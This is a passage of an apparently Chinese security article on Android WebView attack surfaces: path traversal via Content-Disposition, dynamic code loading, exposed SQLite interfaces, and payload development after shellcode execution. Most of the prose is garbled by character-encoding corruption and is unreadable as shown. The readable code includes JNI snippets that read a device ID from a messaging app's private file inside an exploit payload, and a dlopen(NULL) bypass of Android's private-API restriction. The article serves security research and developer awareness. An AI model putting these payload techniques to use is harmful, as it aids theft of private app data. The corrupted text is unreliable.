´åï¼Œåˆ©ç”¨èµ·æ¥éå¸¸ç¨³å®šã€‚å¦å¤–æ­¤ç±»æ¼æ´è°ƒç”¨é€»è¾‘ç›¸å¯¹å¤æ‚ï¼Œå¯èƒ½è¾ƒéš¾é€šè¿‡å®Œå…¨è‡ªåŠ¨åŒ–çš„æ–¹å¼æ‰«æè¯†åˆ«ã€‚&lt;/p&gt;&lt;p&gt;åœ¨ Android ä¸­å› ä¸ºå¼€å‘è€…ä¸ä¸¥è°¨é€ æˆä»»æ„æ–‡ä»¶å†™å…¥çš„æ¼æ´è¾ƒä¸ºå¸¸è§ã€‚é¦–å…ˆæ˜¯å†™æ–‡ä»¶çš„æ¥å£å¯èƒ½æœ¬èº«è®¾è®¡ä¸Šå°±å…è®¸ä¼ å…¥ä»»æ„è·¯å¾„çš„å‚æ•°ï¼Œå¦ä¸€ç§æƒ…å†µå°±æ˜¯ç›´æ¥æ‹¼æ¥è·¯å¾„å¯¼è‡´å¯ä»¥ â€œâ€¦/â€ è¿›è¡Œç›®å½•ç©¿è¶Šã€‚&lt;/p&gt;&lt;p&gt;å¸¸è§çš„åœºæ™¯æœ‰ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ä¸‹è½½è¿œç¨‹æ–‡ä»¶åˆ°æŒ‡å®šçš„è·¯å¾„&lt;/li&gt;&lt;li&gt;è§£å‹ zip æ–‡ä»¶æ—¶æœªå¯¹ ZipEntry æ–‡ä»¶åè¿›è¡Œåˆæ³•æ€§æ£€æŸ¥ï¼Œå¯è·¯å¾„ç©¿è¶Š&lt;/li&gt;&lt;li&gt;ä¸‹è½½æ—¶æœªå¯¹ Content-Disposition: è¿›è¡Œåˆæ³•æ€§æ£€æŸ¥ï¼Œå¯è·¯å¾„ç©¿è¶Š&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;æœ€åä¸€ä¸ªç‚¹æ¯”è¾ƒå°‘äººæ³¨æ„åˆ°ã€‚&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition&quot;&gt;Content Disposition&lt;/a&gt; æ˜¯å¸¸è§çš„ HTTP åè®® headerï¼Œåœ¨æ–‡ä»¶ä¸‹è½½æ—¶å¯ä»¥å‘Šè¯‰å®¢æˆ·ç«¯æµè§ˆå™¨ä¸‹è½½çš„æ–‡ä»¶åã€‚ä¾‹å¦‚æœåŠ¡å™¨è¿”å› Content-Disposition: attachment; filename=&quot;cool.html&quot; ï¼Œæµè§ˆå™¨å°†å¼¹å‡ºå¦å­˜ä¸ºå¯¹è¯æ¡†ï¼ˆæˆ–ç›´æ¥ä¿å­˜ï¼‰ï¼Œé»˜è®¤çš„æ–‡ä»¶åå°±æ˜¯ cool.htmlã€‚&lt;/p&gt;&lt;p&gt;ä½†è¿™ä¸ª filename å‚æ•°æ˜¾ç„¶æ˜¯ä¸å¯ä¿¡ä»»çš„ã€‚ä¾‹å¦‚æ¶æ„ç½‘ç«™è¿”å›çš„æ–‡ä»¶ååŒ…å« ../ï¼Œå½“ Android åº”ç”¨å°è¯•å°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜åˆ° /sdcard/Downloads æ—¶ï¼Œæ”»å‡»è€…å°±æœ‰æœºä¼šæŠŠæ–‡ä»¶å†™å…¥åˆ° /data/ ç›®å½•ä¸­äº†ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0679c320602b350418637272d477a53c_r.png&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;902&quot;&gt;&lt;p&gt;å¦‚æœç”¨æˆ·ä¸å°å¿ƒç‚¹å‡»ç¡®è®¤ä¸‹è½½ï¼Œæ–‡ä»¶å°†ä¼šè¢«å†™å…¥åˆ°æŒ‡å®šçš„ä½ç½®ã€‚è¿™ç§æ”»å‡»ç”šè‡³å®Œå…¨ä¸éœ€è¦ WebView å…è®¸æ‰§è¡Œ Javascriptï¼ˆsetJavaScriptEnabled(true)ï¼‰ï¼Œåªè¦ç®€å•åœ¨ HTTP æœåŠ¡å™¨ä¸­æ·»åŠ ä¸€ä¸ªæ¶æ„ header å³å¯å®ç°ã€‚&lt;/p&gt;&lt;p&gt;åœ¨å†™å…¥æ–‡ä»¶åä¾¿æ˜¯ä»£ç çš„åŠ è½½ã€‚å‡ ç§å¸¸è§çš„ Android ä¸‹åŠ¨æ€åŠ è½½å¯æ‰§è¡Œä»£ç çš„æ–¹å¼ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;DexClassLoader åŠ¨æ€è½½å…¥åº”ç”¨å¯å†™å…¥çš„ dex å¯æ‰§è¡Œæ–‡ä»¶&lt;/li&gt;&lt;li&gt;java.lang.Runtime.exec æ–¹æ³•æ‰§è¡Œåº”ç”¨å¯å†™å…¥çš„ elf æ–‡ä»¶&lt;/li&gt;&lt;li&gt;System.load å’Œ System.loadLibrary åŠ¨æ€è½½å…¥åº”ç”¨å¯å†™å…¥çš„ elf å…±äº«å¯¹è±¡&lt;/li&gt;&lt;li&gt;æœ¬åœ°ä»£ç ä½¿ç”¨ systemã€popen ç­‰ç±»ä¼¼å‡½æ•°æ‰§è¡Œåº”ç”¨å¯å†™å…¥çš„ elf æ–‡ä»¶&lt;/li&gt;&lt;li&gt;æœ¬åœ°ä»£ç ä½¿ç”¨ dlopen è½½å…¥åº”ç”¨å¯å†™å…¥çš„ elf å…±äº«å¯¹è±¡&lt;/li&gt;&lt;li&gt;åˆ©ç”¨ Multidex æœºåˆ¶ï¼š&lt;a href=&quot;https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/&quot;&gt;A Pattern for Remote Code Execution using Arbitrary File Writes and MultiDex Applications&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;å¦‚æœåº”ç”¨åŠ¨æ€åŠ è½½ä»£ç ä¹‹å‰æœªåšç­¾åæ ¡éªŒï¼Œåˆ©ç”¨å­˜åœ¨ä»»æ„æ–‡ä»¶å†™å…¥é—®é¢˜çš„ WebView æ‰©å±•æ¥å£è¿›è¡Œè¦†ç›–ï¼Œå¯å®ç°ç¨³å®šçš„ä»»æ„ä»£ç æ‰§è¡Œã€‚æ­¤å¤–ç”±äºåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­å†™å…¥äº†å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜å¯ä»¥å®ç°æŒä¹…åŒ–æ”»å‡»çš„æ•ˆæœã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;SQLite æ¥å£&lt;/b&gt;&lt;/p&gt;&lt;p&gt;éƒ¨åˆ†åº”ç”¨ä¸º WebView æä¾›äº†å¯æ‰§è¡Œä»»æ„ SQL è¯­å¥çš„æ‰©å±•æ¥å£ï¼Œå…è®¸æ‰“å¼€å’ŒæŸ¥è¯¢æ–‡ä»¶åå¯æ§çš„æ•°æ®åº“ï¼›é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨ WebKit ä¸­æœ‰ä¸€ä¸ªæ¯”è¾ƒå°‘ç”¨çš„ WebDatabase åŠŸèƒ½ï¼Œå·²è¢« W3C æ ‡å‡†åºŸå¼ƒï¼Œä½† WebKit å’Œ Chromium ä»ç„¶ä¿ç•™äº†å®ç°ã€‚SQLite3 ä¸­å­˜åœ¨ä¸€äº›å·²çŸ¥çš„æ”»å‡»é¢ï¼ˆå¦‚ load_extension å’Œ fts3_tokenizer ç­‰ï¼‰ï¼Œå› æ­¤æµè§ˆå™¨çš„ WebSQL å¯¹ SQL ä¸­å¯æŸ¥è¯¢çš„å‡½æ•°åšäº†ç™½åå•é™åˆ¶ã€‚&lt;/p&gt;&lt;p&gt;ä½†é•¿äº­å®‰å…¨å®éªŒå®¤å‘ç°ï¼Œå³ä½¿æ˜¯æµè§ˆå™¨ç™½åå•ä¸­çš„ SQLite3 å‡½æ•°ä¾ç„¶å­˜åœ¨å¯åˆ©ç”¨çš„å®‰å…¨æ€§é—®é¢˜ï¼Œæœ€ç»ˆå¯å®ç°ä¸€å¥—åˆ©ç”¨åœ¨ Chrome å’Œ Safari ä¸¤å¤§æµè§ˆå™¨ä¸Šé€šç”¨çš„ä»£ç æ‰§è¡Œã€‚æ­¤æ¼æ´è¢«ç”¨äº 2017 å¹´ Pwn2Own é»‘å®¢å¤§èµ›ä¸Šæ”»å‡» Safari æµè§ˆå™¨ã€‚&lt;b&gt;æ­¤æ¼æ´å½±å“æ‰€æœ‰æ”¯æŒ WebDatabase çš„æµè§ˆå™¨ï¼ˆWindowsã€Linuxã€macOSã€iOSã€Android ä¸Šçš„ Chromeã€Safariï¼‰ï¼ŒåŒ…æ‹¬å¤šä¸ª App å‚å•†åŸºäº blink æˆ– WebKit åˆ†æ”¯å¼€å‘çš„æµè§ˆå™¨å¼•æ“ï¼Œå½±å“æ•°é‡éå¸¸å¯è§‚ã€‚&lt;/b&gt;æ¼æ´ç›®å‰å·²è¢« SQLite å’Œç›¸å…³æµè§ˆå™¨å¼•æ“ä¿®å¤ã€‚å…³äºæ¼æ´åˆ©ç”¨ç»†èŠ‚ï¼Œé•¿äº­å®‰å…¨å®éªŒå®¤å°†åœ¨ BlackHat å¤§ä¼šä¸Šè¿›è¡Œè¯¦ç»†è®²è§£ï¼š&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/us-17/briefings/schedule/index.html#many-birds-one-stone-exploiting-a-single-sqlite-vulnerability-across-multiple-software-7024&quot;&gt;https://www.blackhat.com/us-17/briefings/schedule/index.html#many-birds-one-stone-exploiting-a-single-sqlite-vulnerability-across-multiple-software-7024&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-da02b6f502423f9df84571d9dcc86248_r.png&quot; data-rawwidth=&quot;1031&quot; data-rawheight=&quot;475&quot;&gt;&lt;p&gt;å³ä½¿æ˜¯åšäº†æƒé™é™åˆ¶çš„ WebDatabase ä¾ç„¶ä¼šå‡ºç°é—®é¢˜ï¼Œè€Œæˆ‘ä»¬ä¸æ—¶å¯ä»¥çœ‹åˆ°ä¸€äº›åº”ç”¨ç›´æ¥å°† SQLite æŸ¥è¯¢æ¥å£ä¸åšä»»ä½•é™åˆ¶å°±æš´éœ²ç»™äº† WebViewã€‚è¿™æ„å‘³ç€ä½¿ç”¨ä¹‹å‰å·²çŸ¥çš„æ”»å‡»æ–¹å¼ï¼ˆfts3_tokenizerã€load_extensionã€attach å¤–éƒ¨æ•°æ®åº“ç­‰ï¼‰å°†å¯ä»¥ç»“åˆè„šæœ¬çš„èƒ½åŠ›å¾—åˆ°å……åˆ†åˆ©ç”¨ã€‚&lt;/p&gt;&lt;p&gt;ä¸€äº›åº”ç”¨å…è®¸é€šè¿‡å‚æ•°æ‰“å¼€æŒ‡å®šæ–‡ä»¶åï¼Œå®ç°ä¸Šå­˜åœ¨ä»»æ„è·¯å¾„æ‹¼æ¥çš„æ¼æ´ã€‚æ¶æ„é¡µé¢å¯ä»¥æ‰“å¼€ä»»æ„ App æ²™ç›’ç›®å½•ä¸‹ä»»æ„æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ï¼Œå°†ç§æœ‰æ•°æ®å®Œå…¨æš´éœ²ç»™æ”»å‡»è€…ã€‚&lt;/p&gt;&lt;p&gt;ä¸ºäº†å®‰å…¨ä»¥åŠå®é™…å¼€å‘å·¥ç¨‹é‡è€ƒè™‘ï¼Œæˆ‘ä»¬å»ºè®®åœ¨å¼€å‘æ··åˆåº”ç”¨æ—¶ï¼Œå¦‚éœ€ä¸º HTML5 åº”ç”¨æä¾›ç¦»çº¿å­˜å‚¨èƒ½åŠ›ï¼Œå¯ç›´æ¥ä½¿ç”¨ localStorageã€IndexedDB ç­‰ APIã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;å…¶ä»–å¯é€šè¿‡æ‰©å±•æ¥å£è§¦å‘çš„é—®é¢˜&lt;/b&gt;&lt;/p&gt;&lt;p&gt;æ‰©å±•æ¥å£åœ¨å¢å¼ºäº† Web å†…å®¹çš„è¡¨ç°åŠ›çš„åŒæ—¶ï¼Œä¹Ÿä¸ºåº”ç”¨å¢å¤§äº†æ”»å‡»é¢ã€‚ä¸€äº›éœ€è¦æœ¬åœ°æ‰èƒ½è§¦å‘çš„é—®é¢˜ï¼Œå¦‚ Intentã€ContentProvider ç­‰ï¼Œå¯ä»¥é€šè¿‡æ‰©å±•æ¥å£æä¾›çš„ä¾¿åˆ©å¾—ä»¥è¿œç¨‹åˆ©ç”¨ã€‚&lt;/p&gt;&lt;p&gt;ä¾‹å¦‚ï¼Œä½¿ç”¨ js å”¤èµ· Activity æ˜¯å¾ˆå¸¸è§çš„åŠŸèƒ½ï¼›å¼€å¯ setAllowContentAccess å WebView å¯ä»¥é€šè¿‡ content:// è®¿é—® ContentProviderï¼Œç”šè‡³æ‰©å±•æ¥å£æœ¬èº«æä¾›äº†è¿™æ ·çš„èƒ½åŠ›â€¦â€¦è¿™äº›åŸæœ¬éœ€è¦æœ¬åœ°å®‰è£…æ¶æ„åº”ç”¨ï¼Œéœ€è¦å¯¼å‡º Activityã€ContentProvider æ‰èƒ½è§¦å‘çš„é—®é¢˜ï¼Œå¯ä»¥è¢«è¿œç¨‹è°ƒç”¨äº†ã€‚&lt;/p&gt;&lt;p&gt;åº”ç”¨æœ¬èº«çš„å®ç°ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å‘½ä»¤æ³¨å…¥ã€å…è®¸ js è®¿é—®åå°„ç­‰å®‰å…¨é—®é¢˜ã€‚æ¯”å¦‚è¿™ç¯‡æ–‡ç« ä»‹ç»äº†æŸ Android ä¸Šçš„æµè§ˆå™¨ Appï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶å†™å…¥ã€SQL æ³¨å…¥ã€XSS ç­‰é—®é¢˜ï¼Œæœ€ç»ˆå¯ä»¥è·¨åŸŸè·å–ç”¨æˆ·ä¿¡æ¯ã€è¿œç¨‹æ‰§è¡Œä»£ç ï¼š&lt;a href=&quot;http://d3adend.org/blog/?p=851&quot;&gt;http://d3adend.org/blog/?p=851&lt;/a&gt;&lt;/p&gt;&lt;p&gt;åº”ç”¨å¼€å‘è€…åœ¨åšæ¥å£çš„æ—¶å€™ï¼Œä¸ä»…éœ€è¦å°å¿ƒé¿å…ä»£ç æœ¬èº«çš„å®‰å…¨æ¼æ´ï¼Œåœ¨ js è°ƒç”¨è€…çš„åŸŸä¸Šåšå¥½é™åˆ¶ã€‚&lt;/p&gt;&lt;h2&gt;ä» shellcode åˆ°æ”»å‡»è½½è·&lt;/h2&gt;&lt;p&gt;ç”±äºç›®å‰ï¼ˆ&amp;lt; Android Oï¼‰é»˜è®¤æ²¡æœ‰å¯ç”¨éš”ç¦»è¿›ç¨‹çš„ WebViewï¼Œå°†æµè§ˆå™¨å¼•æ“çš„æ¼æ´ç§»æ¤åˆ° Android å¹³å°æ¥æ”»å‡»å¸¦ WebView çš„åº”ç”¨ã€‚å¤šæ•°æµè§ˆå™¨å¼•æ“æ¼æ´åˆ©ç”¨ä¼šæœ€ç»ˆæ‰§è¡Œä¸€æ®µ shellcodeã€‚ä¸è¿‡ä»…ä»…åå¼¹ä¸€ä¸ª shell æ˜¾ç„¶ä¸è¶³ä»¥å®ç°æ”»å‡» Appï¼Œè¿˜è¦æœ‰é’ˆå¯¹æ€§åœ°è°ƒç”¨ä¸€äº› Android è™šæ‹Ÿæœºè¿è¡Œæ—¶çš„ç‰¹æ€§ã€‚&lt;/p&gt;&lt;p&gt;ä¾‹å¦‚é€šè¿‡ App æƒé™è¯»å–çŸ­ä¿¡ã€è”ç³»äººï¼Œæˆ–è€…éœ€è¦è§£å¯†åº”ç”¨è‡ªèº«ä½¿ç”¨çš„æŸä¸ª SQLite æ•°æ®åº“çš„å†…å®¹ï¼Œå°±éœ€è¦ä½¿ç”¨ JNI å®ç°ç›¸åº”çš„é€»è¾‘ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;è½½è·çš„è½½å…¥&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å°±æ”»å‡»ç‰¹å®šåº”ç”¨çš„åœºæ™¯è€Œè¨€ï¼Œå°†è½½è·å®Œå…¨ä½¿ç”¨ shellcode ç”šè‡³ ROP å¹¶éä¸å¯èƒ½ï¼Œä½†æˆ–å¤šæˆ–å°‘å¢åŠ å·¥ä½œé‡ã€‚æœ‰ä¸€ä¸ª shell ä¹‹åå¯ä»¥åšä»€ä¹ˆï¼Ÿå¾ˆå®¹æ˜“æƒ³åˆ°ä¸‹è½½ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ç„¶ååŠ è½½ã€‚Android æ²¡æœ‰è‡ªå¸¦ wget æˆ– curlï¼Œé™¤éç”¨æˆ·è‡ªè¡Œ root å¹¶å®‰è£… busyboxã€‚ä¸è¿‡æœ‰ xxd å‘½ä»¤å¯ä»¥ä½¿ç”¨ï¼Œä½¿ç”¨ echo å’Œç®¡é“é‡å®šå‘çš„æ–¹å¼è¿˜æ˜¯å¯ä»¥å®ç°ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶çš„ã€‚&lt;/p&gt;&lt;p&gt;å¦‚æœä¸æƒ³åœ¨æ–‡ä»¶ç³»ç»Ÿç•™ä¸‹ç—•è¿¹ï¼Œæ‰‹å·¥æ¨¡æ‹ŸåŠ¨æ€é“¾æ¥ã€é‡å®šä½ ELFï¼Œå¯åœ¨å†…å­˜ä¸­ç›´æ¥åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶ã€‚BadKernel æ˜¯ä¸€ä¸ªåˆ©ç”¨äº† V8 ä¸Šæ¸¸å·²ç»ä¿®è¡¥ï¼Œä½†æœªåŠæ—¶åŒæ­¥åˆ°ç¬¬ä¸‰æ–¹ fork ä¸­çš„æ¼æ´ï¼Œæ”»å‡»æŸçŸ¥åå³æ—¶èŠå¤©åº”ç”¨çš„æ¡ˆä¾‹ã€‚åœ¨ &lt;a href=&quot;https://github.com/secmob/BadKernel/blob/master/exploit.html#L282&quot;&gt;BadKernel çš„åˆ©ç”¨ä»£ç &lt;/a&gt; ä¸­ï¼Œè°ƒç”¨ JNI æŸ¥è¯¢ ContentProvider è·å–çŸ­ä¿¡çš„é€»è¾‘æ˜¯å•ç‹¬ç¼–è¯‘åˆ°ä¸€ä¸ª so ä¸­çš„ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-26127902353e28f2005f0593cbd237d2_r.png&quot; data-rawwidth=&quot;1071&quot; data-rawheight=&quot;689&quot;&gt;&lt;p&gt;åœ¨ä½œè€…å…¬å¼€çš„åˆ©ç”¨ä»£ç ä¸­ï¼Œé¦–å…ˆé€šè¿‡ javascript ä»»æ„åœ°å€è¯»å†™ï¼Œæœç´¢ä¸€è¡Œè°ƒç”¨ dlsym çš„æœºå™¨ç ï¼Œä»ä¸­è§£æå‡º dlopen@plt çš„åœ°å€ï¼Œå†åŠ ä¸Šä¸‰æ¡æŒ‡ä»¤çš„é•¿åº¦è·å¾— dlsym@plt çš„åœ°å€ã€‚è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œæ—¶å°†è¿™ä¸¤ä¸ªå‡½æ•°æŒ‡é’ˆä¼ å…¥ shellcodeï¼Œä»¥è¿›ä¸€æ­¥è§£ææ‰€éœ€çš„å„ç§ç¬¦å·ã€‚æœ€åè¿›å…¥ shellcode ä¸­å®ç°çš„ç®€åŒ–ç‰ˆ linkerï¼Œç›´æ¥å°† ELF æ–‡ä»¶å†…å®¹æ”¾åœ¨ RWX å†…å­˜ä¸­é‡å®šä½å¤„ç†åï¼Œæ‰§è¡Œå…¶ so_main å¯¼å‡ºå‡½æ•°ã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;JNI åŸºç¡€&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Android ä¸­ JVM å’Œ C/C++ å¼€å‘çš„æœ¬åœ°ä»£ç äº’ç›¸è°ƒç”¨ï¼Œå¯ä»¥ä½¿ç”¨ JNIï¼ˆJava Native Interfaceï¼‰ã€‚åœ¨ System.loadLibrary è½½å…¥ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ä¹‹åï¼ŒJVM ä¼šè°ƒç”¨ ELF ä¸­å¯¼å‡ºçš„ JNI_OnLoad(JavaVM *jvm, void *reserved) å‡½æ•°ï¼Œåœ¨è¿™é‡Œå¯ä»¥åšä¸€äº›åˆå§‹åŒ–çš„å·¥ä½œï¼Œä»¥åŠä½¿ç”¨ JNIEnv çš„ RegisterNatives æ–¹æ³•åŠ¨æ€å°† Java æ–¹æ³•ä¸æœ¬åœ°ä»£ç ç»‘å®šã€‚&lt;/p&gt;&lt;p&gt;æœ¬åœ°ä»£ç ä¸º JNI æä¾›çš„æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ JNIEnv çš„æŒ‡é’ˆï¼Œé€šè¿‡è¿™ä¸ªä¸Šä¸‹æ–‡å¯ä»¥è®¿é—® JVM å½“å‰åŠ è½½çš„ç±»ï¼Œé€šè¿‡åå°„æœºåˆ¶è°ƒç”¨ Java å±‚çš„åŠŸèƒ½ã€‚ä¾‹å¦‚å¦‚ä¸‹ Java ä»£ç ï¼š&lt;/p&gt;&lt;code lang=&quot;java&quot;&gt;ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;MicroMsg/CompatibleInfo.cfg&quot;));
HashMap&amp;lt;Integer, String&amp;gt; hashMap = (HashMap&amp;lt;Integer, String&amp;gt;)ois.readObject();
String deviceId = hashMap.get(Integer.valueOf(258));
&lt;/code&gt;&lt;p&gt;ä½¿ç”¨ JNI å®ç°å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;char *id = (char*)malloc(64);
jstring filename = (*env)-&amp;gt;NewStringUTF(env, &quot;MicroMsg/CompatibleInfo.cfg&quot;);
jclass clsFileInputStream = (*env)-&amp;gt;FindClass(env, &quot;java/io/FileInputStream&quot;);
jclass clsObjectInputStream = (*env)-&amp;gt;FindClass(env, &quot;java/io/ObjectInputStream&quot;);
jclass clsHashMap = (*env)-&amp;gt;FindClass(env, &quot;java/util/HashMap&quot;);

jmethodID constructor = (*env)-&amp;gt;GetMethodID(env, clsFileInputStream, &quot;&amp;lt;init&amp;gt;&quot;, &quot;(Ljava/lang/String;)V&quot;);
jobject fileInputStream = (*env)-&amp;gt;NewObject(env, clsFileInputStream, constructor, filename);

constructor = (*env)-&amp;gt;GetMethodID(env, clsObjectInputStream, &quot;&amp;lt;init&amp;gt;&quot;, &quot;(Ljava/io/InputStream;)V&quot;);
jobject objInputStream = (*env)-&amp;gt;NewObject(env, clsObjectInputStream, constructor, fileInputStream);
jmethodID readObject = (*env)-&amp;gt;GetMethodID(env, clsObjectInputStream, &quot;readObject&quot;, &quot;()Ljava/lang/Object;&quot;);
jobject hashmap = (*env)-&amp;gt;CallObjectMethod(env, objInputStream, readObject);

// cast to hash map
jmethodID get = (*env)-&amp;gt;GetMethodID(env, clsHashMap, &quot;get&quot;, &quot;(Ljava/lang/Object;)Ljava/lang/Object;&quot;);
jmethodID toString = (*env)-&amp;gt;GetMethodID(env, (*env)-&amp;gt;FindClass(env, &quot;java/lang/Object&quot;), &quot;toString&quot;, &quot;()Ljava/lang/String;&quot;);

jclass clsInteger = (*env)-&amp;gt;FindClass(env, &quot;java/lang/Integer&quot;);
jmethodID valueOf = (*env)-&amp;gt;GetStaticMethodID(env, clsInteger, &quot;valueOf&quot;, &quot;(I)Ljava/lang/Integer;&quot;);
jobject key = (*env)-&amp;gt;CallStaticObjectMethod(env, clsInteger, valueOf, 258);
jstring val = (*env)-&amp;gt;CallObjectMethod(env, hashmap, get, key);

strncpy(id, (*env)-&amp;gt;GetStringUTFChars(env, val, 0), len);
&lt;/code&gt;&lt;p&gt;æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJNIEnv æ˜¯ç³»ç»Ÿåˆå§‹åŒ–å¹¶ä¼ ç»™ native æ–¹æ³•çš„ã€‚ä½†åœ¨å¼€å‘åˆ©ç”¨è½½è·çš„æ—¶å€™ä¸æ˜¯ä½¿ç”¨æ ‡å‡†çš„æ–¹å¼åŠ è½½é“¾æ¥åº“ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ä¸€äº›ç§æœ‰ APIã€‚å¦‚æœä»£ç ç›´æ¥è¿è¡Œåœ¨ App è¿›ç¨‹ä¸­ï¼Œå¯é€šè¿‡ android::AndroidRuntime::getJNIEnv ç›´æ¥è·å–ï¼Œæˆ–è€… JNI_GetCreatedJavaVMs è·å¾—å½“å‰è¿›ç¨‹çš„å”¯ä¸€ JVM å®ä¾‹åè°ƒç”¨å…¶ GetEnv æ–¹æ³•ã€‚å¦‚æœä½¿ç”¨ç‹¬ç«‹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯é€šè¿‡ JNI_CreateJavaVM åˆ›å»ºä¸€ä¸ªæ–°çš„ JVMã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;Android è°ƒç”¨ JVM çš„ä¸€äº›é—®é¢˜&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://developer.android.com/about/versions/nougat/android-7.0-changes.html?hl=zh-cn#ndk&quot;&gt;Android N å¯¹ NDK é“¾æ¥çš„è¡Œä¸ºåšäº†å˜æ›´&lt;/a&gt;ï¼Œç¦æ­¢é“¾æ¥åˆ°ç§æœ‰ APIï¼ŒåŒ…æ‹¬ä¸Šæ–‡æåˆ°çš„ JVM ç›¸å…³å‡½æ•°ã€‚ä¸€ä¸ªéå¸¸ç®€å•çš„ç»•è¿‡æ–¹å¼æ˜¯å‘ dlopen ä¼ å…¥ç©ºæŒ‡é’ˆä½œä¸ºçš„æ–‡ä»¶åï¼Œdlsym å°†ä¼šåœ¨æ‰€æœ‰å·²åŠ è½½çš„å…±äº«å¯¹è±¡ä¸­æŸ¥æ‰¾ç¬¦å·ã€‚&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;typedef jint (JNICALL *GetCreatedJavaVMs)(JavaVM **, jsize, jsize *);

void *handle = dlopen(NULL, RTLD_NOW);
GetCreatedJavaVMs JNI_GetCreatedJavaVMs =
    (GetCreatedJavaVMs) dlsym(handle, &quot;JNI_GetCreatedJavaVMs&quot;);
&lt;/code&gt;&lt;p&gt;å¦å¤–ä¸€ä¸ªå‘æ˜¯ï¼Œåœ¨ ART ä¸‹ï¼Œä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶å¦‚æœè¦è°ƒç”¨ JNI_CreateJavaVM åˆ›å»º JVMï¼Œé‚£ä¹ˆå®ƒå¿…é¡»å¯¼å‡º InitializeSignalChainã€ClaimSignalChainã€UnclaimSignalChainã€InvokeUserSignalHandlerã€EnsureFrontOfChain è¿™å‡ ä¸ªå›è°ƒå‡½æ•°ï¼Œå¦åˆ™ä¼šåœ¨ logcat é‡Œçœ‹åˆ°å¤§é‡ç±»ä¼¼&lt;br&gt;&quot;InitializeSignalChain is not exported by the main executable.&quot; çš„æç¤ºï¼Œç„¶å SIGABRTã€‚&lt;/p&gt;&lt;p&gt;AOSP å¯¹åº”çš„ä»£ç å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åœ¨è¾“å‡ºè¿™è¡Œæ—¥å¿—ä¹‹åå°±ä¼šè°ƒç”¨ abort()ï¼š&lt;br&gt;&lt;a href=&quot;https://android.googlesource.com/platform/art/+/master/sigchainlib/sigchain_dummy.cc&quot;&gt;https://android.googlesource.com/platform/art/+/master/sigchainlib/sigchain_dummy.cc&lt;/a&gt;&lt;/p&gt;&lt;p&gt;è§£å†³æ–¹æ¡ˆéå¸¸ç®€å•ï¼Œåªè¦åœ¨æºæ–‡ä»¶é‡Œåˆ›å»ºè¿™å‡ ä¸ªå¯¹åº”çš„å‡½æ•°ï¼Œä»£ç ç•™ç©ºï¼Œç„¶ååŠ ä¸Š JNIEXPORT å®è®¾ç½®ä¸ºå¯¼å‡ºç¬¦å·å³å¯ï¼š&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;JNIEXPORT void InitializeSignalChain() { }
JNIEXPORT void ClaimSignalChain() { }
JNIEXPORT void UnclaimSignalChain() { }
JNIEXPORT void InvokeUserSignalHandler() { }
JNIEXPORT void EnsureFrontOfChain() { }
&lt;/code&gt;&lt;h2&gt;å°ç»“&lt;/h2&gt;&lt;p&gt;WebView åœ¨ Android åº”ç”¨å¼€å‘ä¸­åº”ç”¨å¹¿æ³›ï¼ŒåŠŸèƒ½å¤æ‚ï¼Œæ˜¯é¢‡ä¸ºç†æƒ³çš„æ”»å‡»é¢ã€‚ç‚¹å¼€ä¸€ä¸ªé“¾æ¥æˆ–è€…æ‰«æä¸€ä¸ªäºŒç»´ç å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç å¹¶ä¸ä»…ä»…æ˜¯éƒ½å¸‚ä¼ è¯´ã€‚å¼€å‘è€…åœ¨ä½¿ç”¨ WebView çš„æ—¶å€™ä¸ä»…è¦æ³¨æ„è€ç”Ÿå¸¸è°ˆçš„å„ç§ getSettings()ã€javascriptInterface ç‚¹ï¼Œè¿˜è¦æ³¨æ„é˜²èŒƒé€šè¿‡æ‰©å±•æ¥å£æš´éœ²çš„æ”»å‡»é¢å’Œå®‰å…¨é—®é¢˜ã€‚&lt;/p&gt;&lt;h2&gt;å‚è€ƒèµ„æ–™&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition&quot; 